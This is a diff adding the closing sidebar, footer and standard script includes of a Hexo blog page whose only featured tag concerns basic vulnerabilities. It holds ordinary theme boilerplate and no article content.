+    
+
+                
+            <!-- Sidebar Container -->
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                <!-- Featured Tags -->
+                
+                <section>
+                    <!-- no hr -->
+                    <h5><a href="/tags/">FEATURED TAGS</a></h5>
+                    <div class="tags">
+                       
+                          <a class="tag" href="/tags/#基础漏洞" title="基础漏洞">基础漏洞</a>
+                        
+                    </div>
+                </section>
+                
+
+                <!-- Friends Blog -->
+                
+            </div>
+        </div>
+    </div>
+</article>
+
+
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+<!-- anchor-js, Doc:http://bryanbraun.github.io/anchorjs/ -->
+<script>
+    async("https://cdn.bootcss.com/anchor-js/1.1.1/anchor.min.js",function(){
+        anchors.options = {
+          visible: 'hover',
+          placement: 'left',
+          icon: 'ℬ'
+        };
+        anchors.add().remove('.intro-header h1').remove('.subheading').remove('.sidebar-container h5');
+    })
+</script>
+
+
+<style  type="text/css">
+    /* place left on bigger screen */
+    @media all and (min-width: 800px) {
+        .anchorjs-link{
+            position: absolute;
+            left: -0.75em;
+            font-size: 1.1em;
+            margin-top : -0.1em;
+        }
+    }
+</style>
+
+
+
+    <!-- Footer -->
+    <!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <ul class="list-inline text-center">
+
+                
+                    <li>
+                        <a target="_blank"  href="https://github.com/ThomasXu-blockchain">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                </ul>
+                <p class="copyright text-muted">
+                    Copyright &copy; Thomas_Xu 2022 
+                    <br>
+                    Powered by 
+                    <a href="https://github.com/dusign/hexo-theme-snail" target="_blank" rel="noopener">
+                        <i>hexo-theme-snail</i>
+                    </a> | 
+                    <iframe name="star" style="margin-left: 2px; margin-bottom:-5px;" frameborder="0" scrolling="0"
+                        width="100px" height="20px"
+                        src="https://ghbtns.com/github-btn.html?user=dusign&repo=hexo-theme-snail&type=star&count=true">
+                    </iframe>
+                </p>
+            </div>
+        </div>
+    </div>
+
+</footer>
+
+<!-- jQuery -->
+
+<script src="/js/jquery.min.js"></script>
+
+
+<!-- Bootstrap Core JavaScript -->
+
+<script src="/js/bootstrap.min.js"></script>
+
+
+<!-- Custom Theme JavaScript -->
+
+<script src="/js/hux-blog.min.js"></script>
+
+
+<!-- Search -->
+
+<script src="/js/search.js"></script>
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+
+<!-- jquery.tagcloud.js -->
+<script>
+    // only load tagcloud.js in tag.html
+    if($('#tag_cloud').length !== 0){
+        async("https://dusign.net/js/jquery.tagcloud.js",function(){
+            $.fn.tagcloud.defaults = {
+                //size: {start: 1, end: 1, unit: 'em'},
+                color: {start: '#bbbbee', end: '#0085a1'},
+            };
+            $('#tag_cloud a').tagcloud();
+        })
+    }
+</script>
+
+<!--fastClick.js -->
+<script>
+    async("https://cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+
+<!-- Google Analytics -->
+
+
+
+
+<!-- Baidu Tongji -->
+
+
+<!-- Search -->
+
+    <script type="text/javascript">      
+        var search_path = "search.xml";
+        if (search_path.length == 0) {
+            search_path = "search.xml";
+        }
+    var path = "/" + search_path;
+    searchFunc(path, 'local-search-input', 'local-search-result');
+    </script>
+
+
+<!-- busuanzi -->
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+
+	<a id="rocket" href="#top" class=""></a>
+	<script type="text/javascript" src="/js/totop.js?v=1.0.0" async=""></script>
+    <script type="text/javascript" src="/js/toc.js?v=1.0.0" async=""></script>
+
+    
+        <!-- background effects line -->
+        
+
+        
+            <script type="text/javascript" src="/js/mouse-click.js" content='[&quot;🌱&quot;,&quot;just do it&quot;,&quot;🍀&quot;]' color='[&quot;rgb(121,93,179)&quot; ,&quot;rgb(76,180,231)&quot; ,&quot;rgb(184,90,154)&quot;]'></script>
+        
+
+        <!-- background effects end -->
+    
+
+    <!--<script size="50" alpha='0.3' zIndex="-999" src="/js/ribbonStatic.js"></script>-->
+    
+        <script src="/js/ribbonDynamic.js"></script>
+    
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+</body>
+
+</html>
